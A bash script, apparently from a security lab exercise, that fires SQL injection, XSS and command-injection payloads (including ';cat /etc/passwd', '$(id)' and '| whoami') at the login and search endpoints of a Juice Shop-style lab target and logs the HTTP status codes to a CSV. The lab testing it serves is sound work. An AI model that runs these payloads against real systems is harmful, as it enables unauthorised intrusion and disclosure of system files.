#!/usr/bin/env bash
# Step 7 / Step 10: Advanced attack testing.
# Each attack type is sent to the endpoint that best matches it:
#
#   sqli          POST /rest/user/login           email: ' or 1=1--
#   xss           GET  /rest/products/search?q=   <img src=x onerror=alert(1)>
#   cmdinj        POST /rest/user/login           password: ;cat /etc/passwd
#   cmdinj_subst  POST /rest/user/login           password: $(id)
#   cmdinj_pipe   POST /rest/user/login           password: | whoami
#
# Output: results/advanced_attack_results.csv  (attack,method,endpoint,payload,code)

set -u

TARGET="${TARGET:-http://juice.lab}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RESULTS_DIR="$SCRIPT_DIR/../results"
OUT="$RESULTS_DIR/advanced_attack_results.csv"
mkdir -p "$RESULTS_DIR"

LOGIN="$TARGET/rest/user/login"
SEARCH="$TARGET/rest/products/search"

csv_field() {
  # Quote a CSV field and escape embedded double quotes.
  printf '"%s"' "${1//\"/\"\"}"
}

record() {
  local attack="$1" method="$2" endpoint="$3" payload="$4" code="$5"
  {
    printf '%s,%s,%s,' "$attack" "$method" "$endpoint"
    csv_field "$payload"
    printf ',%s\n' "$code"
  } >> "$OUT"
}

post_login() {
  # $1 = attack name, $2 = email, $3 = password, $4 = payload shown in output
  local attack="$1" email="$2" password="$3" shown="$4"
  local body
  body=$(printf '{"email": "%s", "password": "%s"}' "$email" "$password")
  echo "[*] Testing $attack"
  echo "    Method: POST"
  echo "    Endpoint: $LOGIN"
  echo "    Payload: $body"
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
    -X POST -H 'Content-Type: application/json' \
    --data-raw "$body" "$LOGIN")
  record "$attack" POST "$LOGIN" "$shown" "$code"
}

get_search() {
  local attack="$1" q="$2"
  echo "[*] Testing $attack"
  echo "    Method: GET"
  echo "    Endpoint: $SEARCH?q="
  echo "    Payload: $q"
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -G \
    --data-urlencode "q=$q" "$SEARCH")
  record "$attack" GET "$SEARCH" "$q" "$code"
}

echo "attack,method,endpoint,payload,code" > "$OUT"

post_login sqli         "' or 1=1--"     'x'                  "' or 1=1--"
get_search xss          '<img src=x onerror=alert(1)>'
post_login cmdinj       'test@juice.lab' ';cat /etc/passwd'   ';cat /etc/passwd'
post_login cmdinj_subst 'test@juice.lab' '$(id)'              '$(id)'
post_login cmdinj_pipe  'test@juice.lab' '| whoami'           '| whoami'

echo "[+] Wrote $(cd "$RESULTS_DIR" && pwd)/advanced_attack_results.csv"
